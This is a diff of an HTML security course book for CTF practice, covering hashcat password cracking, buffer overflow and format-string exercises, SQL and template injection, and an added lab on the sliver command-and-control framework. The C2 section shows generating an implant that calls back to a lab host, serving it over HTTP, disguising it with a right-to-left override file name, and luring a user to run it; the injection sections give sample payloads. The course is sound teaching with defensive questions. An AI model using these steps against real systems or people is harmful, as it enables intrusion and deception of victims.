 <div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-passwords-1"><a class="header" href="#cracking-passwords-1">Cracking passwords</a></h1>
 <p>Want to try your hand at cracking hashed passwords using your new Kali instance? Download a test file here: <a href="passwords/shadow">Example shadow file</a>.</p>
 <p>Next, answer the following questions:</p>
@@ -679,53 +686,53 @@ Be sure that you have version 17 or higher. </p>
 <li>Find the following command. Kali menu -- 05 – Password Attacks -- wordlists. What does this do?</li>
 <li>What is the rockyou wordlist? Where does it come from?</li>
 <li>Using hashcat and the rockyou wordlist, attack the sample file from above.</li>
-<li>How long did it take your computer to crack this password? How many characters was the password? </li>
+<li>How long did it take your computer to crack this password? How many characters was the password?</li>
 <li>What does this tell you about using passwords that are susceptible to dictionary attacks?</li>
 </ol>
 <p>HINT: hashcat is pretty good about detecting the hashing algorithm. In other words, try at least once without the <code>-m</code> option and see if the hash is autodetected.</p>
-<p>HINT2: Try a dictionary attack here, which is part of the &quot;Straight&quot; attack method of hashcat. How do you tell it which type of attack to use?</p>
+<p>HINT2: Try a dictionary attack here, which is part of the "Straight" attack method of hashcat. How do you tell it which type of attack to use?</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="binary-exploits"><a class="header" href="#binary-exploits">Binary Exploits</a></h1>
 <p>In this type of CTF challenge, we are able to interact with a running program. The goal is usually to find edges cases or other vulnerabilities that let you exploit the file in a way unintended by the author.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="echoing-hex-values"><a class="header" href="#echoing-hex-values">echo'ing hex values</a></h1>
 <p>Sometimes we need to send hex values to a remote system to test out an edge case. The <code>echo</code> command can help... just use the <code>-e</code> command line option.</p>
 <p>Try piping echo into your connection. In this case, we're connected using netcat.</p>
-<pre><code>echo -e &quot;\xde\xad\xbe\xef&quot; | nc &lt;host&gt; &lt;port&gt;
+<pre><code>echo -e "\xde\xad\xbe\xef" | nc &lt;host&gt; &lt;port&gt;
 </code></pre>
 <p>Want to suppress the newline?  Use <code>-n</code></p>
-<pre><code>echo -e -n &quot;\xde\xad\xbe\xef\x03\x34\x43\x0d\x0a&quot; | nc &lt;host&gt; &lt;port&gt;
+<pre><code>echo -e -n "\xde\xad\xbe\xef\x03\x34\x43\x0d\x0a" | nc &lt;host&gt; &lt;port&gt;
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="buffer-overflows-intro"><a class="header" href="#buffer-overflows-intro">Buffer Overflows (Intro)</a></h1>
 <p>Let's check out the example C program below.</p>
 <pre><code class="language-C">// Replace the line below with the real flag.
-char flag[] = &quot;replace with real flag&quot;;
+char flag[] = "replace with real flag";
 
 // Replace the line below with the actual passcode
-char passcode[] = &quot;123456&quot;;
+char passcode[] = "123456";
 char nickname[12];
 char user_passcode[7];
 
-printf(&quot;\nWhat should we call you: &quot;);
-scanf(&quot;%s&quot;, nickname);
+printf("\nWhat should we call you: ");
+scanf("%s", nickname);
 
-printf(&quot;\nGreetings %s. &quot;, nickname);
-printf(&quot;Please enter the six character passcode: &quot;);
-scanf(&quot;%s&quot;, user_passcode);
+printf("\nGreetings %s. ", nickname);
+printf("Please enter the six character passcode: ");
+scanf("%s", user_passcode);
 
 if (strncmp(passcode, user_passcode, 6) == 0) {
-    printf(&quot;\nNice work! The flag is %s&quot;, flag);
+    printf("\nNice work! The flag is %s", flag);
 }
 else {
-    printf(&quot;\nSorry. passcode is incorrect.&quot;);
+    printf("\nSorry. passcode is incorrect.");
 }
 </code></pre>
-<p>You can download the x86 ELF binary <a href="bufferoverflow/overcode">here</a> if you would like. </p>
+<p>You can download the x86 ELF binary <a href="bufferoverflow/overcode">here</a> if you would like.</p>
 <p>There's a way to exploit this program and get the flag without knowing the passcode at all. Work with a teammate to brainstorm how you might do so.</p>
 <p>In an x86 compatible VM (or emulator), attempt to run the program and try your solution.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h1>
 <p>With a colleague, sketch out how the following items would be arranged on the stack.</p>
 <p>Assume the following:</p>
 <ul>
-<li>We are dealing with a 32-bit, little endian processor. </li>
+<li>We are dealing with a 32-bit, little endian processor.</li>
 <li>int's are four bytes each</li>
 </ul>
 <p>Code:</p>
@@ -758,12 +765,12 @@ int_array[4] located at 0xffccb9c0
 z located at 0xffccb9c0
 </code></pre>
 <p>Which is generated by running:</p>
-<pre><code class="language-C">printf(&quot;int_array[0] located at %p\n&quot;, &amp;int_array[0]);
-printf(&quot;int_array[1] located at %p\n&quot;, &amp;int_array[1]);
-printf(&quot;int_array[2] located at %p\n&quot;, &amp;int_array[2]);
-printf(&quot;int_array[3] located at %p\n&quot;, &amp;int_array[3]);
-printf(&quot;int_array[4] located at %p\n&quot;, &amp;int_array[4]);
-printf(&quot;z located at %p\n&quot;, &amp;z);
+<pre><code class="language-C">printf("int_array[0] located at %p\n", &amp;int_array[0]);
+printf("int_array[1] located at %p\n", &amp;int_array[1]);
+printf("int_array[2] located at %p\n", &amp;int_array[2]);
+printf("int_array[3] located at %p\n", &amp;int_array[3]);
+printf("int_array[4] located at %p\n", &amp;int_array[4]);
+printf("z located at %p\n", &amp;z);
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="quick-disassembly"><a class="header" href="#quick-disassembly">Quick Disassembly</a></h1>
 <p>Need an address of a function? Open the binary in gdb using:</p>
@@ -779,14 +786,14 @@ printf(&quot;z located at %p\n&quot;, &amp;z);
 <p>Take a look at the following code:</p>
 <pre><code class="language-C">int main(int argc, char *argv[]) {
 
-    printf(&quot;Welcome to %s\n&quot;, argv[0]);
-    printf(&quot;You called the program with %d options. They are:\n&quot;, argc-1);
+    printf("Welcome to %s\n", argv[0]);
+    printf("You called the program with %d options. They are:\n", argc-1);
 
     if (argc &gt; 1) {
         int j;
         for (j=1; j &lt; argc; j++) {
         printf(argv[j]);
-        printf(&quot;\n&quot;);
+        printf("\n");
         }
     }
     return 0;
@@ -814,32 +821,32 @@ You called the program with 1 options. They are:
 </code></pre>
 <p>And just like that we start dumping memory!</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="injections"><a class="header" href="#injections">Injections</a></h1>
-<p>User input is always dangerous! Malicious actors will attempt to find and exploit any possible vulnerabilities your code. </p>
+<p>User input is always dangerous! Malicious actors will attempt to find and exploit any possible vulnerabilities your code.</p>
 <p>In this course we will look at two different types of user inputs that lead to undesired program execution:</p>
 <ul>
 <li>Abusing unsanitized SQL statements to leak information or bypass authentication.</li>
 <li>Causing remote code execution in websites that rely on templates to generate content.</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
-<p>Many systems rely on databases as their backend. Take for instance an online store that sells items through a website. The website relies on databases to store not only pricing information, inventory status, and shipping info, but also user account information such as addresses, usernames, and passwords. The standard language used to communicate with many relational databases is known as Structured Query Language, aka SQL. </p>
+<p>Many systems rely on databases as their backend. Take for instance an online store that sells items through a website. The website relies on databases to store not only pricing information, inventory status, and shipping info, but also user account information such as addresses, usernames, and passwords. The standard language used to communicate with many relational databases is known as Structured Query Language, aka SQL.</p>
 <p>The problem comes when the SQL query is based on elements of user input. The designers may have intended the user to provide details crucial to an inventory search, but threat actors have included portions of a SQL query itself to steer execution in their desired direction.</p>
-<p>The classic example is evaluating username and password by simply pulling them from a database. A query might look like </p>
+<p>The classic example is evaluating username and password by simply pulling them from a database. A query might look like</p>
 <pre><code class="language-SQL">SELECT * FROM user_db WHERE username = fred AND password = rightsaidfred
 </code></pre>
 <p>A developer could build this query in a naive way by reading in a string from the user and storing it in variables, say <code>userid_input</code> and <code>password_input</code>.</p>
-<p>Then </p>
-<pre><code>sql_string = &quot;SELECT * FROM user_db WHERE username =  &quot; + userid_input + &quot; AND password = &quot; + password_input;
+<p>Then</p>
+<pre><code>sql_string = "SELECT * FROM user_db WHERE username =  " + userid_input + " AND password = " + password_input;
 </code></pre>
 <p>The string above would allow malicious users to inject SQL commands of their own. For example, if the user knew a username and then entered <code>something OR 1 = 1</code> for the password, the query would then be:</p>
-<pre><code>sql_string = &quot;SELECT * FROM user_db WHERE username = fred AND password = something OR 1 = 1&quot;;
+<pre><code>sql_string = "SELECT * FROM user_db WHERE username = fred AND password = something OR 1 = 1";
 </code></pre>
 <p>where the OR statement is paired with something that is always true. We know that the password <code>something</code> is incorrect, but the addition of the <code>OR 1 = 1</code> would cause this portion of the statement to always evaluate TRUE, thereby bypassing the password check entirely!!!</p>
 <hr />
-<p>Most CTF players will develop cheat sheets on common SQL injections, especially since there can be subtle differences in how different database vendors handle queries. </p>
+<p>Most CTF players will develop cheat sheets on common SQL injections, especially since there can be subtle differences in how different database vendors handle queries.</p>
 <p><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/">Example SQL Injection cheat sheet.</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server Side Template Injection</a></h1>
-<p>Frameworks like Flask and Django (Python), Liquid (Ruby), Handlebars (NodeJS), etc. are ways of extending traditional programming languages into interactive web applications. </p>
-<p>Vulnerabilities can occur when user input is not sanitized. These are especially dangerous because they allow remote code execution (RCE). </p>
+<p>Frameworks like Flask and Django (Python), Liquid (Ruby), Handlebars (NodeJS), etc. are ways of extending traditional programming languages into interactive web applications.</p>
+<p>Vulnerabilities can occur when user input is not sanitized. These are especially dangerous because they allow remote code execution (RCE).</p>
 <hr />
 <p>Example:</p>
 <p>Flask (a Python web framework) uses double curly braces <code>{{}}</code> to mix Python code into an HTML page. A malicious user could post <code>{{ 7*7 }}</code> to see if the answer 49 appears anywhere in the resulting webpage, illustrating that RCE is possible.</p>
@@ -852,12 +859,74 @@ You called the program with 1 options. They are:
 <li>
 <p>Initial Recon:</p>
 <p>Determine which framework (Handlebars, Flask, etc.) is being used. One possibility is to send all the most common framework escape characters to see if any trigger a response. An example of this would be:</p>
-<p><code>${{&lt;%[%'&quot;}}%\.</code></p>
+<p><code>${{&lt;%[%'"}}%\.</code></p>
 </li>
 <li>
-<p>After elucidating which web framework, consult an <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">SSTI cheat sheet like this</a> or use an automated tool like <a href="https://github.com/epinna/tplmap/blob/master/burp_extension/README.md">this plugin</a> for Burp Suite. </p>
+<p>After elucidating which web framework, consult an <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">SSTI cheat sheet like this</a> or use an automated tool like <a href="https://github.com/epinna/tplmap/blob/master/burp_extension/README.md">this plugin</a> for Burp Suite.</p>
 </li>
 </ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sliver-c2-platform-and-kali"><a class="header" href="#sliver-c2-platform-and-kali">sliver C2 platform and Kali</a></h1>
+<h2 id="pieces-of-a-typical-command-and-control-attack"><a class="header" href="#pieces-of-a-typical-command-and-control-attack">Pieces of a typical Command and Control attack</a></h2>
+<p>There are three pieces to a typical C2 setup:</p>
+<ol>
+<li>A server which accepts incoming connections from a compromised machine.</li>
+<li>A client that the threat actor uses to connect, through the C2 server, to the compromised machine.</li>
+<li>The implant or beacon which is run on the compromised machine.</li>
+</ol>
+<p>Let's start building our C2 system.</p>
+<p>On Kali, first do:
+<code>sudo apt install sliver</code></p>
+<p>Next, make sure your networking is in place. For instance, if you are connecting to a host over a VPN do that now and then execute:</p>
+<p><code>ip a</code></p>
+<p>and record the relevant ip address.</p>
+<p>Finally, let's make a directory like <code>sliver</code> and then <code>cd</code> into it.</p>
+<h3 id="1-starting-up-the-sliver-server"><a class="header" href="#1-starting-up-the-sliver-server">1. Starting up the sliver server</a></h3>
+<p>For piece 1, we start the server and then craft the exploit so that it knows to call home to this.
+<code>sliver-server</code></p>
+<h3 id="2-start-an-http-server-as-your-c2-server"><a class="header" href="#2-start-an-http-server-as-your-c2-server">2. Start an http server as your C2 server</a></h3>
+<p><code>http</code></p>
+<p>This should bind to port 80. If not, change the port as needed.</p>
+<h3 id="3-create-an-implant"><a class="header" href="#3-create-an-implant">3. Create an implant</a></h3>
+<p>We need to create an implant that phones home to our server.</p>
+<pre><code>generate -b http://10.6.1.70
+</code></pre>
+<p>Then execute</p>
+<p><code>implants</code></p>
+<p>to ensure that the implant is created and pointing to the correct server. Note the <code>Name</code> of the implant.</p>
+<h3 id="4-get-the-implant-to-the-user"><a class="header" href="#4-get-the-implant-to-the-user">4. Get the implant to the user</a></h3>
+<p>In pentesting, this is where you need to get creative and do a bit of social engineering to encourage the user to download and execute this file. It could be via email, messaging, etc.</p>
+<p>For the sake of this demo, open a shell and find where your implant is located. Execute:</p>
+<p><code>python3 -m http.server</code></p>
+<p>to start a web server which can serve this implant. It is likely running at port 8000.</p>
+<p><code>document\u202Efdp.exe</code></p>
+<h3 id="5-demo-using-thms-box"><a class="header" href="#5-demo-using-thms-box">5. DEMO: Using THM's Box</a></h3>
+<p>We used the <code>Blue</code> box to learn about RCE's and metasploit. Let's also try it here.</p>
+<p>Start <code>Blue</code> on THM and record the IP address of the box.</p>
+<p>Remote desktop into the machine using:</p>
+<p><code>rdesktop IP_ADDRESS</code></p>
+<p>Log in as <code>Jon</code> with <code>alqfna22</code> as a password. (How did you get this?)</p>
+<p>Open a web browser and connect back to your Kali box at port, something like
+<code>http://10.6.1.70:8000</code></p>
+<p>Find the implant. Download it and run it. pwned!</p>
+<h3 id="6-watch-for-connections-on-your-c2-server"><a class="header" href="#6-watch-for-connections-on-your-c2-server">6. Watch for connections on your C2 server.</a></h3>
+<p>If this all works, you should see a new session on the sliver-server. Type</p>
+<p><code>use</code> to start working with this session.</p>
+<p>Do commands like <code>ls</code> and <code>whoami</code> from the prompt.</p>
+<p>Try taking a screen shot of the machine.</p>
+<p>Can you get the flags from this machine this way?</p>
+<h3 id="7-what-is-next"><a class="header" href="#7-what-is-next">7. What is next?</a></h3>
+<h4 id="red-team"><a class="header" href="#red-team">RED TEAM:</a></h4>
+<ul>
+<li>How would you get this payload to the user? What tactics would you use?</li>
+<li>What challenges do you think you will need to overcome?</li>
+<li>You've just scored your first implant inside the corporate IT network. What is your plan of attack from here?</li>
+</ul>
+<h4 id="blue-team"><a class="header" href="#blue-team">BLUE TEAM:</a></h4>
+<ul>
+<li>How do you prevent C2 implants?</li>
+<li>How do you detect C2 implants?</li>
+<li>How do protect against the next move of the red team after successfully scoring a C2 implant?</li>
+</ul>
 
                     </main>
 
